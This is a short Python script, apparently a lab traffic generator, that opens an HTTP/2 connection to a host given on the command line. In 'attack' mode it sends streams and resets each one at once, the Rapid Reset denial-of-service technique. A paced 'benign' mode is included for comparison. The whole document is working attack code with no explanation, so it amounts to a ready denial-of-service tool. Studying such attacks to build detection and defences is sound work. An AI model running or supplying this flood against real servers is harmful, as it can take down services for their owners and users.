import socket, sys, time, h2.connection, h2.config
host, mode, n = sys.argv[1], sys.argv[2], int(sys.argv[3]); time.sleep(3)
s = socket.create_connection((host, 80)); c = h2.connection.H2Connection(h2.config.H2Configuration(client_side=True))
c.initiate_connection(); s.sendall(c.data_to_send())
for i in range(n):
    sid = c.get_next_available_stream_id()
    c.send_headers(sid, [(':method','GET'),(':path','/'),(':scheme','http'),(':authority',host)], end_stream=True)
    if mode == "attack": c.reset_stream(sid)          # rapid reset: cancel at once
    s.sendall(c.data_to_send())
    if mode == "benign": time.sleep(0.05)
time.sleep(1); s.close(); print(mode, "sent", n, "streams")
